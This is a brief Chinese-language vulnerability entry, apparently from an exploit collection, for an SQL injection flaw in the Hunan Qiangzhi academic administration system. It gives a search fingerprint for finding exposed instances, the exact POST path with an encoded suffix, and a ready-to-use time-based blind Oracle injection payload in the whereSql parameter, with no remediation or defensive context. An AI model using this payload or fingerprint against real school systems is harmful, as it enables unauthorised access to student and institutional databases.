# 湖南强智教务管理系统sjxx存在SQL注入漏洞

湖南强智教务管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="湖南强智科技发展有限公司"`
- **请求**：`POST /jiaowu/stkxt/sjxx/sjxx_sp_list.js%70 HTTP/1.1`

**Payload**
```
whereSql= AND 6371=DBMS_PIPE.RECEIVE_MESSAGE(CHR(107)CHR(66)CHR(105)CHR(89),8)
```
- **响应特征**：200